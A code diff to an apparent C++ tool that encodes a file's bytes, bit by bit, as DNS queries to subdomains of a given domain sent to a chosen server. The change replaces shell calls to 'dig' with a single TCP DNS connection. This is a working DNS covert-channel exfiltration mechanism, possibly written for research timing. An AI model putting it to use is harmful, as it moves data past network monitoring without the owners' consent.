@@ -9,7 +9,9 @@
 #include <chrono>
 #include <thread>
 #include <vector>
+
 #include "extension_map.h"
+#include "dns_tcp_client.h"
 using namespace std;
 
 #ifdef DEBUG
@@ -17,18 +19,6 @@ using namespace std;
 #else
 #define DEBUG_COUT(x) do {} while(0)
 #endif
-
-bool transmit(string query_domain, string dns_server){
-    string cmd;
-    cmd = "dig +noall +tcp +https @" + dns_server + " " + query_domain;
-    DEBUG_COUT(cout << "Executing command: " << cmd << endl;);
-    int ret = system(cmd.c_str());
-    if (ret == -1) {
-        cerr << "Failed to execute command: " << cmd << endl;
-        return false;
-    }
-    return true;
-}
 
 bool send_message(string filename, string nxdomain, string dns_server){
     // Read input file 
@@ -71,29 +61,33 @@ bool send_message(string filename, string nxdomain, string dns_server){
     input_file.read(value, size); 
     input_file.close();
 
+    // --- v4 NEW: connect once ---
+    DnsTcpClient client;
+    if (!client.connect_to(dns_server, "53")) {
+        delete[] value;
+        return false;
+    }
+
+    // Initialize resp buffer
+    vector<uint8_t> resp;
 
     // Step1: Send type (8-bit) 
     bitset<8> b_type(type[0]);
-    vector<thread> workers;
-    workers.reserve(b_type.size());
-    
     for (size_t i = 0; i < b_type.size(); i++) {
         DEBUG_COUT(cout << "b_type[" << i << "]: " << b_type[i] << endl;);
         if (b_type[i] == 1) {
             string query_domain = to_string(i) + "." + nxdomain;         
-            workers.emplace_back([query_domain, &dns_server]{
-                transmit(query_domain, dns_server);
-            });
+            if (!client.query_raw(query_domain, resp)) {
+                client.close();
+                delete[] value;
+                return false;
+            }
         }
     }
-
-    for (auto &t: workers) t.join();
 
     // Step2: Send length (24-bit) 
     for (size_t i = 0; i < 3; i++) {
         bitset<8> b_length(length[i]);
-        vector<thread> workers;
-        workers.reserve(b_length.size());
         DEBUG_COUT(cout << "===================\n" 
              << "length[" << i << "]: " << length[i] << "  "
              << "b_length holds " << b_length << endl;);
@@ -102,20 +96,18 @@ bool send_message(string filename, string nxdomain, string dns_server){
             if (b_length[j] == 1) {
                 int index = 8 + i*8 + j;
                 string query_domain = to_string(index) + "." + nxdomain;
-                workers.emplace_back([query_domain, &dns_server]{
-                    transmit(query_domain, dns_server);
-                });
+                if (!client.query_raw(query_domain, resp)) {
+                    client.close();
+                    delete[] value;
+                    return false;
+                }
             }
         }
-
-        for (auto &t: workers) t.join();
     }
 
     // Step3: Send value
     for (size_t i = 0; i < size; i++) {
         bitset<8> bits(value[i]);
-        vector<thread> workers;
-        workers.reserve(bits.size());
         DEBUG_COUT(cout << "===================\n"
              << "value[" << i << "]: " << value[i] << "  "
              << "bits holds " << bits << endl;);
@@ -124,13 +116,13 @@ bool send_message(string filename, string nxdomain, string dns_server){
             if (bits[j] == 1) {
                 int index = 32 + i*8 + j;
                 string query_domain = to_string(index) + "." + nxdomain;
-                workers.emplace_back([query_domain, &dns_server]{
-                    transmit(query_domain, dns_server);
-                });
+                if (!client.query_raw(query_domain, resp)) {
+                    client.close();
+                    delete[] value;
+                    return false;
+                }
             }
         }
-
-        for (auto &t: workers) t.join();
     }
        
     // free memory
@@ -148,7 +140,7 @@ int main(int argc, char** argv){
 
     // ------ start measure ------
     auto start = chrono::high_resolution_clock::now();
-    if(!send_message(argv[1], argv[2], argv[3])){
+    if (!send_message(argv[1], argv[2], argv[3])) {
         cerr << "send message() failed.\n";
         return 1;
     }
